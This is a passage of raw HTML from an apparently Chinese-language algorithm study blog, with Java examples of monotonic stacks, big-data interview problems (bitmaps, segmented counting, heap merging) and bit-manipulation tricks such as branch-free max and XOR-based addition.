punctuation">)</span><span class="token punctuation">;</span>            res<span class="token punctuation">[</span>temp<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>stack<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> temp <span class="token operator">=</span> stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        res<span class="token punctuation">[</span>temp<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> stack<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">:</span> stack<span class="token punctuation">.</span><span class="token function">peek</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        res<span class="token punctuation">[</span>temp<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> res<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-0-有重复数字"><a href="#2-0-有重复数字" class="headerlink" title="2.0 有重复数字"></a>2.0 有重复数字</h3><p>栈存放关于下标的链表，依然是从栈底到栈顶的值是从大到小</p><p>遇到相等的值则存放到同样值的链表尾部</p><p>当出栈后，需要用到新栈顶的信息时，选择栈顶链表的尾部作为左边最近的比它大的</p><blockquote><p>想要找两边比它小的就让栈从小到大即可</p></blockquote><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">monotonousStack</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">Stack</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">List</span><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span><span class="token punctuation">></span></span> stack <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Stack</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> res <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span>arr<span class="token punctuation">.</span>length<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>stack<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">></span> arr<span class="token punctuation">[</span>stack<span class="token punctuation">.</span><span class="token function">peek</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span> temp <span class="token operator">=</span> stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span> curpeek <span class="token operator">=</span> stack<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token keyword">null</span> <span class="token operator">:</span> stack<span class="token punctuation">.</span><span class="token function">peek</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> leftIndex <span class="token operator">=</span> curpeek <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">?</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">:</span> curpeek<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>curpeek<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">Integer</span> each<span class="token operator">:</span>temp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                res<span class="token punctuation">[</span>each<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> leftIndex<span class="token punctuation">;</span>                res<span class="token punctuation">[</span>each<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>stack<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> arr<span class="token punctuation">[</span>stack<span class="token punctuation">.</span><span class="token function">peek</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">==</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>            stack<span class="token punctuation">.</span><span class="token function">peek</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span> list <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>            stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>list<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>stack<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span> temp <span class="token operator">=</span> stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span> curpeek <span class="token operator">=</span> stack<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token keyword">null</span> <span class="token operator">:</span> stack<span class="token punctuation">.</span><span class="token function">peek</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> leftIndex <span class="token operator">=</span> curpeek <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">?</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">:</span> curpeek<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>curpeek<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">Integer</span> each<span class="token operator">:</span>temp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            res<span class="token punctuation">[</span>each<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> leftIndex<span class="token punctuation">;</span>            res<span class="token punctuation">[</span>each<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> res<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><p>正数数组，数组中所有数的和与最小值的乘积叫做指标A。求数组的子数组中，指标A的最大值</p><p>对于数组每个数arr[i]，得到以该数为最小值的子数组的指标A的值</p><p>借鉴单调栈的思想，想得到以每个数为最小值的子数组，只需要得到每个数左边和右边最近的比它小的位置，那么想得到的子数组就是从左边求得的位置+1，到右边求得的位置-1</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">minTimesSum</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> size <span class="token operator">=</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span>    <span class="token keyword">int</span> max <span class="token operator">=</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span>MIN_VALUE<span class="token punctuation">;</span>    <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> sums <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span>size<span class="token punctuation">]</span><span class="token punctuation">;</span>    sums<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> arr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>size<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span> sums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> sums<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token class-name">Stack</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span> stack <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Stack</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>size<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>stack<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> arr<span class="token punctuation">[</span>stack<span class="token punctuation">.</span><span class="token function">peek</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> temp <span class="token operator">=</span> stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            max <span class="token operator">=</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>max<span class="token punctuation">,</span>                    arr<span class="token punctuation">[</span>temp<span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token punctuation">(</span>stack<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">?</span> sums<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">:</span> <span class="token punctuation">(</span>sums<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">-</span> sums<span class="token punctuation">[</span>stack<span class="token punctuation">.</span><span class="token function">peek</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                   <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>stack<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> temp <span class="token operator">=</span> stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        max <span class="token operator">=</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>max<span class="token punctuation">,</span>                arr<span class="token punctuation">[</span>temp<span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token punctuation">(</span>stack<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">?</span> sums<span class="token punctuation">[</span>size<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">:</span> <span class="token punctuation">(</span>sums<span class="token punctuation">[</span>size<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">-</span> sums<span class="token punctuation">[</span>stack<span class="token punctuation">.</span><span class="token function">peek</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> max<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="大数据问题"><a href="#大数据问题" class="headerlink" title="大数据问题"></a>大数据问题</h2><h3 id="利用分段统计思想节省空间"><a href="#利用分段统计思想节省空间" class="headerlink" title="利用分段统计思想节省空间"></a>利用分段统计思想节省空间</h3><p>32位无符号整数的范围是0~4,294,967,295（42亿+），现在有一个正好包含40亿个无符号整数的文件，所以在整个范围中必然存在没出现过的数。可以使用最多1GB的内存，怎么找到所有未出现过的数？</p><h4 id="1-0-2"><a href="#1-0-2" class="headerlink" title="1.0"></a>1.0</h4><p>使用2^32个bit去标记，哪个数出现过就标记哪个bit为1，这样做的空间为2^32 bits = 2^29 Bytes = 2^19 KB = 2^9 MB (512 MB)</p><h4 id="2-0-2"><a href="#2-0-2" class="headerlink" title="2.0"></a>2.0</h4><p>内存限制为3KB，但是只用找到一个没出现过的数即可</p><p>首先思考如果只有3 KB，那么对于一个无符号整数数组最多可以开多少空间</p><p>3 K / 4（1个无符号整数为4 B）大概为700多，那么对应2的次幂，大概是大于2^9 = 512，小于2^10，所以开unsigned int[512]完全够用</p><p>然后将0 - 2^32-1分成512份，每份有2^23个数，所以数组[0]存放40亿个无符号整数中0 - 2^23-1范围内的数出现了几次，数组[1]存放40亿个无符号整数中2^23 - 2^23+2^23-1范围内的数出现了几次</p><p>因为只有40亿个数，所以数组中至少有一个数小于2^23，那么我们就可以确定要求得的没出现过的数一定属于这个范围，然后将这个范围再分成512份，再把40亿个数分一遍，不在这个范围的就不管了，然后新的512份一定至少有一份还是不够，然后继续分下去，一定能够找到没有出现过的</p><blockquote><p>1 KB 就让 1 K / 4</p><p>完全同理</p></blockquote><h4 id="3-0"><a href="#3-0" class="headerlink" title="3.0"></a>3.0</h4><p>如果限制有限几个变量的话，怎么办?</p><p>将0 - 2^32-1二分，一定至少有一半不足2^31个，继续二分下去即可</p><h4 id="0x02-找40亿个整数的中位数"><a href="#0x02-找40亿个整数的中位数" class="headerlink" title="0x02 找40亿个整数的中位数"></a>0x02 找40亿个整数的中位数</h4><p>10 KB 内存，同样的思想，10 K / 4 ，大概能开[2048]，那就分成2048份，然后得到每个范围的频率，40亿个数，从[0]开始求和，求到20亿左右，就可以知道中位数在哪个范围，再把这个范围继续分2048，继续求频率，一定可以求出来</p><h3 id="利用位图思想节省空间"><a href="#利用位图思想节省空间" class="headerlink" title="利用位图思想节省空间"></a>利用位图思想节省空间</h3><p>32位无符号整数的范围是0~4294967295，现在有40亿个无符号整数，可以使用最多1 GB的内存，找出所有出现了两次的数</p><p>使用两位位图，即00 - 出现0次，01 - 出现1次，10 - 出现2次，11出现2次以上，统计10的个数即可，所以需要的空间为2^32*2 / 8 个bit = 1GB （正好）</p><h3 id="利用堆做多个结果的合并"><a href="#利用堆做多个结果的合并" class="headerlink" title="利用堆做多个结果的合并"></a>利用堆做多个结果的合并</h3><p>某搜索公司一天的用户搜索词汇是海量的(百亿数据量)，请设计一种求出每天热门Top100 词汇的可行办法</p><p>首先将这些海量数据都用哈希函数分流到小文件里，重复的数据只会出现在一个小文件里，然后就可以使用哈希表，存储小文件中每个词汇对应的频率</p><p>每个小文件做成一个大根堆，所有大根堆都先拿出堆顶，放到总堆（也是大根堆），然后每次弹出总堆堆顶，弹出的这个堆顶是哪个小文件的，就把这个堆顶从小文件删除，该小文件新的堆顶再次进入总堆，循环操作，直至Top100都拿到为止</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>关于大数据题目解题技巧（也可以叫资源限制类题目）</p><p>1）哈希函数可以把数据按照种类均匀分流</p><p>2）布隆过滤器用于集合的建立与查询，并可以节省大量空间</p><p>3）一致性哈希解决数据服务器的负载管理问题</p><p>4）利用并查集结构做岛问题的并行计算</p><p>5）位图解决某一范围上数字的出现情况，并可以节省大量空间</p><p>6）利用分段统计思想、并进一步节省大量空间</p><p>7）利用堆、外排序来做多个处理单元的结果合并</p><h2 id="位运算"><a href="#位运算" class="headerlink" title="位运算"></a>位运算</h2><h3 id="0x01-较大值"><a href="#0x01-较大值" class="headerlink" title="0x01 较大值"></a>0x01 较大值</h3><p>给定两个有符号32位整数a和b，返回a和b中较大的（不能做任何比较判断）</p><p>先设立两个函数</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// 1 -> 0</span><span class="token comment">// 0 -> 1</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">flip</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> n <span class="token operator">^</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 符号位为0，即为非负数 -> 返回1</span><span class="token comment">// 符号位为1，即为负数   -> 返回0</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">sign</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">flip</span><span class="token punctuation">(</span><span class="token punctuation">(</span>n<span class="token operator">>></span><span class="token number">31</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="1-0-3"><a href="#1-0-3" class="headerlink" title="1.0"></a>1.0</h4><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">getMax1</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> b<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> c <span class="token operator">=</span> a <span class="token operator">-</span> b<span class="token punctuation">;</span>    <span class="token keyword">int</span> returnA <span class="token operator">=</span> <span class="token function">sign</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// a>=b 为1，a&lt;b 为0</span>    <span class="token keyword">int</span> returnB <span class="token operator">=</span> <span class="token function">flip</span><span class="token punctuation">(</span>returnA<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> a <span class="token operator">*</span> returnA <span class="token operator">+</span> b <span class="token operator">*</span> returnB<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>利用互斥思想，+号两边两个条件互斥，一个成立另一个一定不成立，即要么返回a，要么返回b</p><p>这里的函数是有问题的，当a和b异号时，会出现溢出的可能性，导致判断错误</p></blockquote><h4 id="2-0-3"><a href="#2-0-3" class="headerlink" title="2.0"></a>2.0</h4><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">getMax2</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> b<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> c <span class="token operator">=</span> a <span class="token operator">-</span> b<span class="token punctuation">;</span>    <span class="token keyword">int</span> sa <span class="token operator">=</span> <span class="token function">sign</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> sb <span class="token operator">=</span> <span class="token function">sign</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> sc <span class="token operator">=</span> <span class="token function">sign</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> difSab <span class="token operator">=</span> sa <span class="token operator">^</span> sb<span class="token punctuation">;</span> <span class="token comment">// a和b同号则为0，异号则为1</span>    <span class="token keyword">int</span> sameSab <span class="token operator">=</span> <span class="token function">flip</span><span class="token punctuation">(</span>difSab<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 同号则为1，异号则为0</span>    <span class="token comment">// 什么时候返回a</span>    <span class="token comment">// 同号时sc为1 + 异号时sa为1</span>    <span class="token keyword">int</span> returnA <span class="token operator">=</span> sameSab <span class="token operator">*</span> sc <span class="token operator">+</span> difSab <span class="token operator">*</span> sa<span class="token punctuation">;</span>    <span class="token keyword">int</span> returnB <span class="token operator">=</span> <span class="token function">flip</span><span class="token punctuation">(</span>returnA<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> a <span class="token operator">*</span> returnA <span class="token operator">+</span> b <span class="token operator">*</span> returnB<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="0x02-2的次幂"><a href="#0x02-2的次幂" class="headerlink" title="0x02 2的次幂"></a>0x02 2的次幂</h3><p>判断一个32位正数是不是2的幂、4的幂</p><p>对于2的幂，数字特征为所有bit上只有1个bit为1</p><p>一个方法是取出最右边的1（(~n+1)&amp;n）看是否与原数相等</p><p>另一个方法是，直接减1，那么如果是2的幂，则那个为1的bit位变为0，右边所有bit都会为1，那么与原数相与，看是否为0</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token function">is2Power</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>n <span class="token operator">&amp;</span> <span class="token punctuation">(</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>对于4的幂，首先看是否是2的幂，这就确定了只有1个bit位为1</p><p>4的幂数字特征为”为1的bit位只在0，2，4，8，… bit位上”，所以让原数与(010101…0101)相与，结果如果为0说明1在1, 3, 5, …,bit位上，为1说明在0, 2, 4, 8, … bit位上</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token function">is4Power</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>n <span class="token operator">&amp;</span> <span class="token punctuation">(</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>n <span class="token operator">&amp;</span> <span class="token number">0x55555555</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="0x03-基本四则运算"><a href="#0x03-基本四则运算" class="headerlink" title="0x03 基本四则运算"></a>0x03 基本四则运算</h3><p>给定两个有符号32位整数a和b，不能使用算术运算符，分别实现a和b的加、减、乘、除运算（如果给定a、b执行加减乘除的运算结果就会导致数据的溢出，那么你实现的函数不必对此负责，除此之外请保证计算过程不发生溢出）</p><h4 id="加"><a href="#加" class="headerlink" title="加"></a>加</h4><p>13 - 01101</p><p>7   - 00111</p><p>两数做异或：01010（相当于两数做无进位相加）</p><p>两数做与：00101（相当于两数如果进行加法运算，代表哪个位会产生进位）</p><p>将与的结果左移1位：01010（这就代表两个数加法运算的进位信息 —— 因为产生进位之后，本质是要往前一位进1的，所以要左移1位）</p><p>所以原数相加的结果就等于“两数做异或” + “将与的结果左移1位”的结果</p><p>重复如此操作，01010 + 01010 = 00000（异或结果）+ 10100 （与的结果左移1位） = 10100（异或结果） + 00000（与的结果左移1位）</p><p>00000代表没有进位信息了，那么结果就是异或结果10100 = 20</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> b<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> temp<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>b <span class="token operator">!=</span> <span 